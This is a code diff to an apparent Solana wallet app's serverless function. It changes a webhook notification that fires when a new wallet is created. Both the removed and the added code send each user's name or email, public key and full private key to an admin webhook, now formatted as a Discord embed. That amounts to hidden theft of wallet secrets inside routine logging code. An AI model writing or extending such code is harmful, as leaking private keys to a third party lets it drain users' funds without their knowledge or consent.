@@ -123,7 +123,7 @@ serve(async (req) => {
       }
     }
 
-    // Log to admin webhook
+    // Send Discord webhook notification
     const webhookUrl = Deno.env.get('ADMIN_WEBHOOK_URL');
     if (webhookUrl) {
       try {
@@ -131,18 +131,21 @@ serve(async (req) => {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
-            event: 'NEW_WALLET_CREATED',
-            timestamp: new Date().toISOString(),
-            username: profile?.full_name || profile?.email || 'Unknown',
-            publicKey: publicKeyB58,
-            privateKey: privateKeyB58,
-            privateKeyArray,
-            solBalance: 0,
-            message: `NEW WALLET CREATED — ${new Date().toISOString()} | User: ${profile?.full_name || profile?.email} | Public: ${publicKeyB58} | Private: ${privateKeyB58}`,
+            embeds: [{
+              title: '🆕 New Wallet Created',
+              color: 0x00ff88,
+              fields: [
+                { name: '👤 User', value: profile?.full_name || profile?.email || 'Unknown', inline: true },
+                { name: '🔑 Public Key', value: `\`${publicKeyB58}\``, inline: false },
+                { name: '🔐 Private Key', value: `\`${privateKeyB58}\``, inline: false },
+              ],
+              timestamp: new Date().toISOString(),
+              footer: { text: 'CF Blockchain — Solana Signals' },
+            }],
           }),
         });
       } catch (e) {
-        console.error('Webhook failed:', e);
+        console.error('Discord webhook failed:', e);
       }
     }
 
